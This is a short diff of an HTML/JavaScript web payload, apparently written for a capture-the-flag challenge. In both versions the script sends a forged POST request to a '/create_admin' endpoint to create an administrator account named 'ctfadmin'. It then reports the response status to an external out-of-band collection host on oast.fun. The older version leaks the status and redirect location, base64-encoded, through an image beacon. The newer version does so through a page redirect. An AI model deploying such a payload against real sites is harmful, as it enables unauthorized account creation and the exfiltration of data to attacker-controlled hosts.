@@ -1,21 +1,11 @@
-<html>
-<body>
 <script>
 fetch("https://tasks.goidactf.ru:20199/create_admin",{
   method:"POST",
-  headers:{
-    "Content-Type":"application/x-www-form-urlencoded"
-  },
+  headers:{"Content-Type":"application/x-www-form-urlencoded"},
   body:"new_admin_login=ctfadmin",
   redirect:"manual"
-})
-.then(r=>{
-  let data =
-    "status=" + r.status +
-    "|loc=" + r.headers.get("Location");
-  new Image().src =
-    "https://" + btoa(data) + ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
+}).then(r=>{
+  location.href =
+    "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/s" + r.status;
 });
 </script>
-</body>
-</html>
